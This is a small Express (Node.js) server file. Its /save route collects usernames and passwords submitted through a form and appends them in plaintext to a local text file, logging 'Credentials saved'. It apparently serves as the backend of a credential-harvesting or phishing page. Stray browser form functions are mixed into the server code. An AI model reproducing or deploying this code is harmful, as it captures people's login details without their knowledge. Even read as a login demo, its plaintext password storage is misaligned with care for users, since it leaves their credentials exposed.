const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/save', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    const entry = `Username: ${username}, Password: ${password}\n`;

    fs.appendFile('output.txt', entry, (err) => {
        if (err) throw err;
        console.log('Credentials saved');
    });

    res.redirect('/');
});


app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});

function openForm() {
    document.getElementById("myForm").style.display = "block";
}

function closeForm() {
    document.getElementById("myForm").style.display = "none";
}